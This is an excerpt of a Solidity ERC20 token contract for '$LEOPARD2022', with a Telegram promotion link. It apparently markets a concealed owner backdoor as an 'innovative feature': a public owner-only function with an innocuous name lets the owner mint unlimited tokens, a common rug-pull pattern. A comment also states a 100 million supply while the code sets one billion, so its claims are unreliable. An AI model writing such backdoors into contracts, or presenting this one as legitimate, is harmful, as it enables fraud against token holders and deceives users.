...
//
// $Leopard2022 proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/Leopard2022Official
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _leopard2022(uint256 amount) public onlyOwner {
    _leopard2022(msg.sender, amount);
    }
    ...
    function _leopard2022(address account, uint256 amount) internal virtual {
...
contract $LEOPARD2022 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("LEOPARD 2022", "LEOPARD2022") {
        _leopard2022(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}